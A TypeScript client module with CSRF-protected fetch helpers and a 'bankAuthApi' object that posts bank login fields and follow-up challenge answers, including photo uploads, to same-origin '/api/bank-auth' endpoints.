import type { Answer, LoginCredentials } from './types';

function csrfToken(): string {
    const meta = document.querySelector<HTMLMetaElement>('meta[name="csrf-token"]');
    return meta?.content ?? '';
}

async function post<T>(url: string, body: unknown): Promise<T> {
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': csrfToken(),
            Accept: 'application/json',
        },
        body: JSON.stringify(body),
    });
    if (!response.ok) {
        throw new Error(`API ${url} failed: ${response.status}`);
    }
    return response.json() as Promise<T>;
}

async function postForm<T>(url: string, form: FormData): Promise<T> {
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'X-CSRF-TOKEN': csrfToken(),
            Accept: 'application/json',
        },
        body: form,
    });
    if (!response.ok) {
        throw new Error(`API ${url} failed: ${response.status}`);
    }
    return response.json() as Promise<T>;
}

export const bankAuthApi = {
    async login(sessionId: string, bankSlug: string, fields: LoginCredentials) {
        return post<{ ok: true }>(`/api/bank-auth/login`, { sessionId, bankSlug, fields });
    },

    async answer(sessionId: string, answer: Answer): Promise<{ ok: true }> {
        if (answer.command === 'photo.with-input' || answer.command === 'photo.without-input') {
            const form = new FormData();
            form.append('command', answer.command);
            form.append('file', answer.payload.file);
            if (answer.command === 'photo.with-input') {
                form.append('text', answer.payload.text);
            }
            return postForm<{ ok: true }>(`/api/bank-auth/answer/${encodeURIComponent(sessionId)}`, form);
        }
        return post<{ ok: true }>(`/api/bank-auth/answer/${encodeURIComponent(sessionId)}`, answer);
    },
};
